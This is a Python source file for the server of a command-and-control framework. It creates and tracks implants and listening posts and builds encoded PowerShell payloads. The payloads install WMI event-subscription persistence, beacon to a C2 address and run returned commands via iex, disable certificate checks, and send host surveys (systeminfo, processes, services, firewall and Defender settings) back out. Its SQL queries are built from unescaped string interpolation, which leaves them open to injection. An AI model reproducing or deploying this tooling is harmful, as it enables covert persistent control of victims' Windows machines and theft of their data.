#!/usr/bin/python3

import time
from base64 import b64encode
from base64 import b64decode
import uuid, string, random

class Implant:
    def __init__(self,UUID,implantkey,notes,c2,filter,consumer,implant_name):
        self.UUID=UUID
        self.key=implantkey
        self.notes=notes
        self.c2=c2
        self.filter=filter
        self.consumer=consumer
        self.name=implant_name

class callback:
    def __init__(self, UUID, time, gateway):
        self.UUID = UUID
        self.time = time
        self.gateway = gateway

class Task:
    def __init__(self, id, UUID, task, notes, time_complete):
        self.id = id
        self.UUID = UUID
        self.task = task
        self.notes = notes
        self.time_complete = time_complete

class Survey:
    def __init__(self, id, UUID, time_delivered, details, data):
        self.id = id
        self.UUID = UUID
        self.time_delivered = time_delivered
        self.details = details
        self.data = data

class ListeningPost:
    """
    Represents a listening post object.

    Attributes:
        id (str): The name of the listening post.
        address (str): The address of the listening post.
        connections_count (int): The number of connections to the listening post.
        verify_key (str): The verification key of the listening post.
        connections (list): A list of UUIDs representing the connections to the listening post.
    """
   
    def __init__(self, name, address, connection):
        connection.commit()
        self.id = name
        self.address = address
        cur = connection.cursor()
        getCount = cur.execute(f"SELECT COUNT(*) FROM implants WHERE c2 = '{address}'")
        getCount = cur.fetchall()
        self.connections_count = getCount[0][0]
        getVerifyKey =  cur.execute(f"SELECT verify_key FROM callbackAddresses WHERE address = '{address}'")
        getVerifyKey = cur.fetchall()
        self.verify_key = getVerifyKey[0][0]
        connections = cur.execute(f"SELECT UUID FROM implants WHERE c2 = '{address}'")
        connections = cur.fetchall()
        self.validation = buildListeningPostValidation(connection, name)
        self.connections = []
        for connection in connections:
            self.connections.append(connection[0])
        cur.close()


def buildListeningPostValidation(connection,name):
    cur = connection.cursor()
    connection.commit()
    cur.execute(f"SELECT verify_key,address FROM callbackAddresses WHERE name = '{name}'")
    data = cur.fetchall()
    verify_key = data[0][0]
    address = data[0][1]
    cur.close()
    messageblock = f"iex(New-Object Net.Webclient).UploadString('{address}', \"{{ 'name':'{name}', 'key':'{verify_key}', 'event' : 'validate' }}\")"
    if address[4] == "s":
        messageblock = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + messageblock
    messageblock = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8')
    messageblock = f"powershell -e {messageblock}"
    return messageblock

    
def getCallbacks(connection, UUID, depth):
    cur = connection.cursor()
    connection.commit()
    checkInGet = cur.execute(f"select * from checkins where UUID='{UUID}' order by last_checkin desc limit {depth}")
    checkInFetch = cur.fetchall()
    callbackList=[]
    
    cur.close()
    for checkIn in checkInFetch:
        callbacks = callback(checkIn[1], checkIn[3], checkIn[2])
        callbackList.append(callbacks)
    return callbackList

def getTasks(connection, UUID, complete):
    cur = connection.cursor()
    connection.commit()
    # Retrieve tasks from the database based on the completion status
    if int(complete) == 0:             #Completed tasks read most recent first
        tasks = cur.execute(f"SELECT id, UUID, task, notes, time_complete FROM tasks WHERE (is_complete={complete}) AND (UUID='{UUID}') ORDER BY id ASC")
    else:                              #Uncompleted tasks read oldest first
        tasks = cur.execute(f"SELECT id, UUID, task, notes, time_complete FROM tasks WHERE (is_complete={complete}) AND (UUID='{UUID}') ORDER BY id desc")
    taskDetails = cur.fetchall()
    taskList = []
    for task in taskDetails:
        taskList.append(Task(task[0], task[1], task[2], task[3], task[4]))
    cur.close()
    return taskList

def getImplant(connection, UUID):
    cur = connection.cursor()
    connection.commit()
    implantQuery = cur.execute(f"SELECT * FROM implants WHERE UUID='{UUID}'")
    implantQuery = cur.fetchall()
    cur.close()
    theImplant = Implant(implantQuery[0][0], implantQuery[0][1], implantQuery[0][2], implantQuery[0][3], implantQuery[0][4], implantQuery[0][5], implantQuery[0][6])
    return theImplant

def getImplantList(connection):
    cur = connection.cursor()
    connection.commit()
    implants = cur.execute("select * from implants")
    implants = cur.fetchall()
    cur.close()
    return implants 

def getC2List(connection):
    cur = connection.cursor()
    c2list = cur.execute("select * from callbackAddresses")
    c2list = cur.fetchall()    
    cur.close()
    return(c2list)

def getSurveyList(connection, UUID):
    connection.commit()
    cur = connection.cursor()
    surveyQuery = cur.execute(f"select id, UUID, delivered, details, data from datastore where (uuid = '{UUID}') order by delivered desc limit 30")
    surveyQuery = cur.fetchall()
    surveyData = []
    for survey in surveyQuery:
        surveyData.append(Survey(survey[0], survey[1], survey[2], survey[3], survey[4]))
    cur.close()
    return surveyData

def addImplant(connection, name, notes, c2, filter, consumer):


    try:
        cur = connection.cursor()
        cur.execute(f"SELECT COUNT(*) FROM implants WHERE implant_name = '{name}'")
        if cur.fetchone()[0] > 0:
            cur.close()
            raise ValueError('The implant name already exists')
        while True:
            UUID = str(uuid.uuid4())
            cur.execute(f"SELECT COUNT(*) FROM implants WHERE UUID = '{UUID}'")
            if cur.fetchone()[0] == 0:
                break
        implantkey = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        cur.execute(f"INSERT INTO implants (implant_name, UUID, implantkey, notes, c2, filter, consumer) VALUES ('{name}', '{UUID}', '{implantkey}', '{notes}', '{c2}', '{filter}', '{consumer}')")
        connection.commit()
        cur.close()
    except Exception as e:
        raise ValueError(e)    
    return

#def addImplant(connection,UUID,implantkey,notes,c2,filter,consumer):
#    cur=connection.cursor()
#    cur.execute(f"INSERT INTO implants (UUID,implantkey,notes,c2,filter,consumer) VALUES ('{UUID}','{implantkey}','{notes}','{c2}','{filter}','{consumer}')")
#    connection.commit()
#    cur.close()
#    return

def addTask(connection,UUID,task,notes):
    connection.commit()
    cur = connection.cursor()
    cur.execute(f"INSERT INTO tasks (UUID,task,notes) VALUES ('{UUID}','{task}','{notes}')")
    connection.commit()
    cur.close()
    return


def deleteTask(connection,taskID):
    cur=connection.cursor()
    connection.commit()
    cur.execute(f"SELECT is_complete FROM tasks WHERE id = {taskID}")
    isComplete = cur.fetchall()
    isComplete=isComplete[0][0]
    if isComplete == 0:
        cur.execute(f"delete from tasks where (id={taskID}) and (is_complete=0)")
        connection.commit()
        cur.close()
    else:
        cur.close()
        raise ValueError('The task has already completed')
    return

def updateNotes(connection,UUID,notes):
    cur=connection.cursor()
    cur.execute(f"update implants set notes='{notes}' where (UUID='{UUID}')")
    connection.commit()
    cur.close()
    return

def deleteImplant(connection,UUID):
    cur=connection.cursor()
    cur.execute(f"DELETE FROM implants WHERE UUID = '{UUID}'")
    connection.commit()
    cur.close()
    return

def deleteListeningPost(connection, name):
    connection.commit()
    cur = connection.cursor()
    cur.execute(f"DELETE FROM callbackAddresses WHERE name = '{name}'")
    connection.commit()
    cur.close()
    return

def addListeningPost(connection, name, address):
    connection.commit()
    if not address.startswith("http"):
        raise ValueError('The address must start with http or https')
#    name = name.replace(" ", "")
    verify_key = b64encode(str(time.time()).encode()).decode()
    cur = connection.cursor()
    callbackNameCheck = cur.execute(f"SELECT COUNT(*) FROM callbackAddresses WHERE name = '{name}'")
    doesNameExist = cur.fetchall()
    callbackAddressCheck = cur.execute(f"SELECT COUNT(*) FROM callbackAddresses WHERE address = '{address}'")
    doesAddressExist = cur.fetchall()
    if doesNameExist[0][0] > 0:
        raise ValueError('The listening post name already exists')
    if doesAddressExist[0][0] > 0:
        raise ValueError('The listening post address already exists')
    cur = connection.cursor()
    cur.execute(f"INSERT INTO callbackAddresses (name, address, verify_key) VALUES ('{name}', '{address}', '{verify_key}')")
    connection.commit()
    cur.close()
    return

def uninstallImplant(connection,UUID):
    uninstallTask=generateInstall(connection,UUID,0)
    uninstallTask=uninstallTask[1]
    addTask(connection,UUID,uninstallTask,"Implant tasked for uninstall")
    return 

def updateSettings(connection,UUID,notes,C2,filter,consumer,interval):
    cur=connection.cursor()
    uninstall = generateInstall(connection,UUID,interval)[1]      #Get the current uninstall information
    cur.execute(f"UPDATE implants SET notes = '{notes}', c2 = '{C2}', filter = '{filter}', consumer = '{consumer}' WHERE UUID = '{UUID}'")
    connection.commit()
    cur.close()
    install = generateInstall(connection,UUID,interval)[0]       #Get the new install information
    uninstallReinstall =  uninstall + ";" + install
    addTask(connection,UUID,uninstallReinstall,"POWERBEACON SYSTEM TASK: Update Implant Settings")
    return    

def getListeningPosts(connection):
    cur = connection.cursor()
    connection.commit()
    listeningPostsList = []
    lplist = getC2List(connection)
    for lp in lplist:
        listeningPostsList.append(ListeningPost(lp[0], lp[1], connection))
    cur.close()
    return listeningPostsList



def generateSurvey(connection,UUID,options,notes):
#Options Key
#[0]Directories
#[1]firewall/netsh
#[2]mp-preference

    task = "$message=(hostname)\n"
    task = task+"$message+= (systeminfo) | Out-String\n"
    task = task+"$message+= (get-process | select-object id, name, path) | Out-String\n"
    task = task+"$message+= (get-service) | Out-String\n"
    if options[0]:
        task = task+"$message+= (get-childitem c:\) | Out-String\n"
        task = task+"$message+= (get-childitem c:\windows) | Out-String\n"
        task = task+"$message+= (get-childitem c:\windows\system32) | Out-String\n"
        task = task+"$message+= (get-childitem \"c:\program files\") | Out-String\n"
        task = task+"$message+= (get-childitem \"c:\program files (x86)\")| Out-String -errorAction SilentlyContinue\n"
    if options[1]:
        task = task+"$message+= \"PortProxy Settings:\"\n"
        task = task+"$message+= (netsh interface portproxy show all) | Out-String\n"
        task = task+"$message+= \"Firewall Profiles:\"\n"
        task = task+"$message+= (get-netconnectionprofile) | Out-String\n"
        task = task+"$message+= (get-netfirewallprofile) | Out-String\n"
    if options[2]:
        task = task+"$message+= (get-mppreference) | Out-String\n"
    
    
    cur=connection.cursor()      #Get C2 address from database
    cur.execute("select c2,implantkey from implants where (UUID = '" + UUID + "')")
    data=cur.fetchall()
    address=data[0][0]
    key=data[0][1]
    task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n" 
    if address[4] == "s":     #ssl bumper if needed
        task = task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"        
    task = task + f"(New-Object Net.Webclient).UploadString('{address}', \"{{ 'UUID':'{UUID}', 'key':'{key}', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '{notes}'  }}\")"
    
    task = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
    task = encodedtask = "powershell -e " + task
    return(task)

def base64Encode(data):
    data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
    return data

def base64Decode(data):
    try:
        data = b64decode(data).decode('UTF-16LE')
    except Exception as e:
        data = "Error decoding data"
    return data

def generateInstall(connection,UUID,interval):
    interval=int(interval)
    cur=connection.cursor()
    connection.commit()
    cur.execute("select * from implants where (UUID='" + UUID + "')")
    implant = cur.fetchall()
    implant=implant[0]
    cur.close()
    UUID = implant[0]
    key = implant[1]
    address = implant[3]
    filter = implant[4]
    consumer = implant[5]
    ssl = False

    if address[4] == "s": #Check http"s" for ssl
        ssl = True
    #set WMIQuery based on interval
    #
    #
    #

    if interval==1:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
    if interval==2:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
    if interval==3:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
    if interval==4:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""
    if interval==5:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
    if interval==0:
        interval_setting="$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""


    #BuildConsumer Block
    messageblock = f"iex(New-Object Net.Webclient).UploadString('{address}', \"{{ 'UUID':'{UUID}', 'key':'{key}', 'event' : 'req' }}\")"
   
    if ssl: #Add SSL powershell cert check overide if SSL
        messageblock = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + messageblock
    
    messageblock = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8') #base64 encode this
    messageblock = f"\"powershell -e {messageblock}\""  # add the 'powershell -e'
     
    #Create WMI Event Subscription Data
    data=f'''
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance();
$instanceFilter.QueryLanguage = "WQL";
{interval_setting};
$instanceFilter.Name = "{filter}";
$instanceFilter.EventNamespace = 'root\cimv2';
$result = $instanceFilter.Put();
$newFilter = $result.Path;
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance();
$instanceConsumer.Name = '{consumer}' ;
$instanceConsumer.CommandLineTemplate  = {messageblock};
$result = $instanceConsumer.Put();
$newConsumer = $result.Path;
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance();
$instanceBinding.Filter = $newFilter;
$instanceBinding.Consumer = $newConsumer;
$result = $instanceBinding.Put();
$newBinding = $result.Path

'''
  
    #Create uninstall commands

    remove_data = f'''
$x="\\\.\\root\subscription:__EventFilter.Name='{filter}'"
([wmi]$x).Delete()
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='{consumer}'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"{consumer}\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"{filter}\\""'
([wmi]$x).Delete()
'''
  
    #base64 encode everything
    data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
    remove_data = b64encode(remove_data.encode('UTF-16LE')).decode('UTF-8')
    data = "powershell -e " + data
    remove_data = "powershell -e " + remove_data
    installLines=[data,remove_data]    
    return(installLines)
